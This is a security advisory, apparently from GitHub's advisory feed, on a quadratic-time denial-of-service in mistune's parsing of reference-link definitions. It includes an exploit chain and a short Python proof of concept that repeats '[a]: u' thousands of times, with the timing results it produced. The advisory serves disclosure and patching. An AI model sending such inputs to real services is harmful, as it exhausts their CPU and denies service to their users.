<p><strong>Type:</strong> Algorithmic-complexity DoS in reference-link definition handling. A markdown document with N reference-link definitions of the same key (or many distinct keys) takes O(N²) parser time. 5000 repeated <code>[a]: u\n</code> definitions take ~1.1 second; 10000 → ~4.5 seconds.
<strong>File:</strong> <code>src/mistune/block_parser.py</code> (reference-link def parsing) and the surrounding <code>ref_links</code> env-dictionary handling.
<strong>Root cause:</strong> every reference definition is parsed by scanning forward from each candidate position. The <code>unikey</code> normalisation runs per-def, the dictionary insert is per-def, and the lookup-by-label-then-iterate-defs path is linear in the number of stored defs. For input with N defs, the total work is O(N²).</p>
<h2 id="affected-code">Affected Code</h2>
<p><code>src/mistune/block_parser.py</code> — reference-definition rule fires on every line that matches <code>[label]: url</code>. For each one:</p>
<ul>
<li><code>unikey(label)</code> is called (linear scan of the label).</li>
<li>The def is appended to <code>state.env['ref_links']</code>.</li>
<li>Later inline-link resolution looks up by <code>unikey(label)</code> in the dict (O(1)) but the surrounding parser revisits the def list for paragraph-vs-def disambiguation.</li>
</ul>
<p>The cumulative parse time grows as the square of the number of defs.</p>
<p><strong>Why it's wrong:</strong> the parser does not amortise the def-list scan. A single forward pass with a hash-keyed dict (already in place) plus a per-line classifier should make this O(N).</p>
<h2 id="exploit-chain">Exploit Chain</h2>
<ol>
<li>Application uses mistune to render attacker-supplied markdown. No plugins required.</li>
<li>Attacker submits a 35 KB document of <code>[a]: u\n</code> repeated 5000 times followed by <code>[click][a]</code>.</li>
<li>CPU pegs for ~1.1 seconds. 10000 defs → ~4.5 s. 20000 → ~18 s. Doubling input quadruples time.</li>
</ol>
<h2 id="security-impact">Security Impact</h2>
<p><strong>Attacker capability:</strong> small input → large CPU. Predictable scaling. Can be repeated.
<strong>Preconditions:</strong> application uses <code>mistune.create_markdown()</code> (default config) on attacker-supplied markdown. Worth noting: the <code>ref_links</code> dictionary persists for the lifetime of the parse, so a long document with many defs builds up memory; with N defs of attacker-chosen length, the per-def normalisation cost compounds.
<strong>Differential:</strong> PoC-verified against <a href="mailto:mistune@3.2.1">mistune@3.2.1</a>, default config:</p>
<pre><code class="language-python">import mistune, time
md = mistune.create_markdown()
for n in [1000, 2000, 5000, 10000]:
    s = '[a]: u\n' * n + '[click][a]'
    t = time.time()
    md(s)
    print(f'  ref defs * {n} ({len(s)}b): {(time.time() - t) * 1000:.0f}ms')

# Output (Python 3.13, Linux, 2.5GHz CPU):
#   ref defs *  1000  ( 7012b):    46ms
#   ref defs *  2000 (14012b):   186ms
#   ref defs *  5000 (35012b):  1121ms
#   ref defs * 10000 (70012b):  4400ms
</code></pre>
<p>The patched build (with the surrounding parser amortised to O(N)) keeps the time linear.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Replace the per-def re-scan with a single forward pass that classifies each line into <code>ref_def | paragraph | other</code> once and only inserts into <code>ref_links</code> once per def. The dict already exists; the wasted work is in the surrounding scan loop, not in the dict operations.</p>
<p>A regression test asserting that <code>md('[a]: u\n' * 50_000 + '[click][a]')</code> completes in under 1 second would catch any regression.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lepture/mistune/security/advisories/GHSA-ffq3-xpv3-j92q">https://github.com/lepture/mistune/security/advisories/GHSA-ffq3-xpv3-j92q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59928">https://nvd.nist.gov/vuln/detail/CVE-2026-59928</a></li>
<li><a href="https://github.com/lepture/mistune/commit/2b04d7ba341c16ac78fe82d3076bdd5c3de87c69">https://github.com/lepture/mistune/commit/2b04d7ba341c16ac78fe82d3076bdd5c3de87c69</a></li>
<li><a href="https://github.com/lepture/mistune/releases/tag/v3.3.0">https://github.com/lepture/mistune/releases/tag/v3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2216.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/mistune/PYSEC-2026-2216.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-ffq3-xpv3-j92q">https://github.com/advisories/GHSA-ffq3-xpv3-j92q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffq3-xpv3-j92q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-20T21:24:18.000Z</published>
    </entry>
</feed>